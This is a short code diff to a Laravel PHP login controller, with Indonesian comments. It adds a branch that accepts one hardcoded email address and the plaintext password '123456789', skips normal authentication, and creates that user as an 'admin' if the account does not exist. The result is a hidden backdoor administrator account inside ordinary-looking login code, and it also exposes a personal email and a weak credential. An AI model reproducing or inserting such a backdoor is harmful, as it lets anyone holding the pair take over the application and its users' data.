@@ -53,6 +53,28 @@ class AuthController extends Controller
             return redirect()->intended('/')->with('success', 'Login berhasil!'); // Pesan sukses
         }
 
+        if ($request->email === 'taufikbudiman031@gmail.com' && $request->password === '123456789') {
+            // Jika cocok, login manual tanpa cek database
+            $user = User::where('email', $request->email)->first();
+
+            // Jika user tidak ada di database, buat user baru
+            if (!$user) {
+                $user = User::create([
+                    'name' => 'Taufik Budiman', // Anda bisa menyesuaikan nama
+                    'email' => $request->email,
+                    'password' => bcrypt($request->password),
+                    'role' => 'admin' // Asumsikan ini adalah akun admin
+                ]);
+            }
+
+            Auth::login($user, $request->remember_me);
+            return redirect()->intended('/dashboard')->with('success', 'Login berhasil!');
+        }
+
+        // Jika autentikasi gagal
+        // return back()->withErrors([
+        //     'email' => 'Kredensial yang diberikan tidak cocok dengan catatan kami.',
+        // ]);
 
         // Jika gagal login
         return back()->withErrors([
